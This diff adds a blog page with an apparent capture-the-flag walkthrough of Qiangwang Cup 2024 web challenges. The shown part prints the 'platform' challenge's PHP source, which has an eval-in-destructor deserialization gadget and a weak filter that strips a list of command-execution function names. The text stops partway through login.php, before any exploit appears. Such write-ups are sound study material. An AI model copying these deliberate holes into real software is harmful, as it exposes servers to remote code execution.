@@ -1,0 +1,1217 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>强网杯 2024 初赛 Web Challenge Walkthrough - L1nq Blog</title><meta name="author" content="L1nq">
+<meta name="description" content="强网杯 2024 初赛 Web Challenge Walkthrough"><meta name="keywords" content='Block, String Buffer Overflow'>
+  <meta itemprop="name" content="强网杯 2024 初赛 Web Challenge Walkthrough">
+  <meta itemprop="description" content="强网杯 2024 初赛 Web Challenge Walkthrough">
+  <meta itemprop="datePublished" content="2025-03-05T20:44:03+00:00">
+  <meta itemprop="dateModified" content="2026-07-09T18:37:37+08:00">
+  <meta itemprop="wordCount" content="2066">
+  <meta itemprop="image" content="https://sw1mblu3.fun/1.jpg">
+  <meta itemprop="keywords" content="Block,String Buffer Overflow"><meta property="og:url" content="https://sw1mblu3.fun/posts/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/">
+  <meta property="og:site_name" content="L1nq Blog">
+  <meta property="og:title" content="强网杯 2024 初赛 Web Challenge Walkthrough">
+  <meta property="og:description" content="强网杯 2024 初赛 Web Challenge Walkthrough">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-03-05T20:44:03+00:00">
+    <meta property="article:modified_time" content="2026-07-09T18:37:37+08:00">
+    <meta property="article:tag" content="Block">
+    <meta property="article:tag" content="String Buffer Overflow">
+    <meta property="og:image" content="https://sw1mblu3.fun/1.jpg">
+<meta name="twitter:card" content="summary" /><meta name="twitter:site" content="@L1nq1_" />
+  <meta name="twitter:creator" content="@L1nq1_" /><meta name="twitter:image" content="https://sw1mblu3.fun/1.jpg" /><meta name="twitter:title" content="强网杯 2024 初赛 Web Challenge Walkthrough" /><meta name="twitter:description" content="强网杯 2024 初赛 Web Challenge Walkthrough" /><meta name="application-name" content="L1nq Blog">
+<meta name="apple-mobile-web-app-title" content="L1nq Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://sw1mblu3.fun/posts/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/" title="强网杯 2024 初赛 Web Challenge Walkthrough - L1nq Blog" /><link rel="prev" type="text/html" href="https://sw1mblu3.fun/posts/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94arl%E4%BC%98%E5%8C%96/" title="资产侦察系统灯塔ARL优化" /><link rel="next" type="text/html" href="https://sw1mblu3.fun/posts/nctf-2025%E6%98%A5%E5%AD%A3%E8%B5%9B/" title="NCTF 2025 Web Writeup&amp;Challenge Walkthrough" /><link rel="alternate" type="text/markdown" href="https://sw1mblu3.fun/posts/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/index.md" title="强网杯 2024 初赛 Web Challenge Walkthrough - L1nq Blog"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "强网杯 2024 初赛 Web Challenge Walkthrough",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/sw1mblu3.fun\/posts\/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0\/"
+    },"image": ["https:\/\/sw1mblu3.fun\/1.jpg"],"genre": "posts","keywords": "Block, String Buffer Overflow","wordcount":  2066 ,
+    "url": "https:\/\/sw1mblu3.fun\/posts\/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0\/","datePublished": "2025-03-05T20:44:03+00:00","dateModified": "2026-07-09T18:37:37+08:00","license": "2026","publisher": {
+      "@type": "Organization",
+      "name": "L1nq Blog","logo": "https:\/\/sw1mblu3.fun\/1.jpg"},"author": {
+        "@type": "Person",
+        "name": "L1nq"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script><meta name="view-transition" content="same-origin">
+<script>
+(function() {
+  
+  var hasNative = false;
+  try {
+    if (typeof CSS !== 'undefined' && CSS.supports) {
+      hasNative = CSS.supports('selector(::view-transition-old(root))');
+    }
+  } catch(e) {}
+  if (hasNative) return;
+
+  
+  document.addEventListener('click', function(e) {
+    var a = (e.target && e.target.closest) ? e.target.closest('a') : null;
+    if (!a || !a.href) return;
+    var url;
+    try { url = new URL(a.href, location.href); } catch(e) { return; }
+    if (url.origin !== location.origin) return;
+    if (a.target && a.target === '_blank') return;
+    if (a.hasAttribute && a.hasAttribute('download')) return;
+    if (e.metaKey || e.ctrlKey || e.altKey || e.shiftKey) return;
+
+    e.preventDefault();
+    try { sessionStorage.setItem('_vt', '1'); } catch(e) {}
+    document.documentElement.style.opacity = '0';
+    document.documentElement.style.transition = 'opacity 0.12s ease-out';
+    setTimeout(function() { location.href = a.href; }, 120);
+  }, { capture: true });
+
+  
+  try {
+    if (sessionStorage.getItem('_vt') === '1') {
+      sessionStorage.removeItem('_vt');
+      document.documentElement.style.opacity = '0';
+      document.documentElement.style.transition = 'none';
+      requestAnimationFrame(function() {
+        requestAnimationFrame(function() {
+          document.documentElement.style.transition = 'opacity 0.2s ease-in';
+          document.documentElement.style.opacity = '1';
+        });
+      });
+    }
+  } catch(e) {}
+})();
+</script>
+</head>
+  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto">
+    <div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" role="button" aria-label="Switch Theme" title="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="theme-switch" role="button" aria-label="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></div>
+      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item"><a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item menu-system"></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>强网杯 2024 初赛 Web Challenge Walkthrough</span>
+      </h1></div><div class="post-meta">
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="meta-calendar-icon">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+        <path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z"/>
+        <path d="M16 3v4"/><path d="M8 3v4"/><path d="M4 11h16"/>
+        <path d="M7 14h.013"/><path d="M10.01 14h.005"/><path d="M13.01 14h.005"/><path d="M16.015 14h.005"/>
+        <path d="M13.015 17h.005"/><path d="M7.01 17h.005"/><path d="M10.01 17h.005"/>
+      </svg><time datetime="2025-03-05T20:44:03Z">5 Mar, 2025</time><span aria-hidden="true">|</span>
+        <a href="true" target="_blank" rel="noopener noreferrer">Edit this page</a></div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#2024-强网杯platform">[2024 强网杯]platform</a></li>
+        <li><a href="#2024-强网杯pyblockly">[2024 强网杯]PyBlockly</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>强网杯 2024 Web Challenge Walkthrough，仅两题</p>
+<h1 class="heading-element" id="web"><span>Web</span>
+  <a href="#web" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><h2 class="heading-element" id="2024-强网杯platform"><span>[2024 强网杯]platform</span>
+  <a href="#2024-%e5%bc%ba%e7%bd%91%e6%9d%afplatform" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>扫描目录得到源码</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/www.zip</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>源码如下</p>
+<p>index.php</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="s1">&#39;user.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="s1">&#39;class.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$sessionManager</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SessionManager</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$SessionRandom</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SessionRandom</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;POST&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$username</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;session_key&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;session_key&#39;</span><span class="p">]</span> <span class="o">=</span><span class="nv">$SessionRandom</span> <span class="o">-&gt;</span> <span class="na">generateRandomString</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$password</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$sessionManager</span><span class="o">-&gt;</span><span class="na">filterSensitiveFunctions</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location: dashboard.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">require</span> <span class="s1">&#39;login.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>class.php</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">notouchitsclass</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">SessionRandom</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">generateRandomString</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$length</span> <span class="o">=</span> <span class="nx">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">50</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$characters</span> <span class="o">=</span> <span class="s1">&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$charactersLength</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$characters</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$randomString</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$randomString</span> <span class="o">.=</span> <span class="nv">$characters</span><span class="p">[</span><span class="nx">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nv">$charactersLength</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$randomString</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">SessionManager</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$sessionPath</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$sessionId</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$sensitiveFunctions</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">,</span> <span class="s1">&#39;eval&#39;</span><span class="p">,</span> <span class="s1">&#39;exec&#39;</span><span class="p">,</span> <span class="s1">&#39;passthru&#39;</span><span class="p">,</span> <span class="s1">&#39;shell_exec&#39;</span><span class="p">,</span> <span class="s1">&#39;popen&#39;</span><span class="p">,</span> <span class="s1">&#39;proc_open&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">session_status</span><span class="p">()</span> <span class="o">==</span> <span class="nx">PHP_SESSION_NONE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s2">&#34;Session has not been started. Please start a session before using this class.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sessionPath</span> <span class="o">=</span> <span class="nx">session_save_path</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sessionId</span> <span class="o">=</span> <span class="nx">session_id</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">getSessionFilePath</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sessionPath</span> <span class="o">.</span> <span class="s2">&#34;/sess_&#34;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sessionId</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">filterSensitiveFunctions</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$sessionFile</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getSessionFilePath</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$sessionFile</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$sessionData</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$sessionFile</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sensitiveFunctions</span> <span class="k">as</span> <span class="nv">$function</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$sessionData</span><span class="p">,</span> <span class="nv">$function</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nv">$sessionData</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="nv">$function</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$sessionData</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$sessionFile</span><span class="p">,</span> <span class="nv">$sessionData</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;Sensitive functions have been filtered from the session file.&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;Session file not found.&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p>login.php</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">&lt;!DOCTYPE html&gt;
+</span></span><span class="line"><span class="cl">&lt;html lang=&#34;en&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;head&gt;
+</span></span><span class="line"><span class="cl">    &lt;meta charset=&#34;UTF-8&#34;&gt;
+</span></span><span class="line"><span class="cl">    &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;
+</span></span><span class="line"><span class="cl">    &lt;title&gt;用户登录&lt;/title&gt;
+</span></span><span class="line"><span class="cl">    &lt;style&gt;
+</span></span><span class="line"><span class="cl">        body {
+</span></span><span class="line"><span class="cl">            background-color: #f0f4f8;
+</span></span><span class="line"><span class="cl">            font-family: Arial, sans-serif;
+</span></span><span class="line"><span class="cl">            display: flex;
+</span></span><span class="line"><span class="cl">            justify-content: center;
+</span></span><span class="line"><span class="cl">            align-items: center;
+</span></span><span class="line"><span class="cl">            height: 100vh;
+</span></span><span class="line"><span class="cl">            margin: 0;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        h1 {
+</span></span><span class="line"><span class="cl">            text-align: center;
+</span></span><span class="line"><span class="cl">            color: #333;
+</span></span><span class="line"><span class="cl">            margin-bottom: 20px;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        .login-container {
+</span></span><span class="line"><span class="cl">            background-color: #fff;
+</span></span><span class="line"><span class="cl">            border-radius: 10px;
+</span></span><span class="line"><span class="cl">            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+</span></span><span class="line"><span class="cl">            padding: 30px;
+</span></span><span class="line"><span class="cl">            width: 300px;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        label {
+</span></span><span class="line"><span class="cl">            display: block;
+</span></span><span class="line"><span class="cl">            margin-bottom: 5px;
+</span></span><span class="line"><span class="cl">            color: #555;
+</span></span><span class="line"><span class="cl">        }
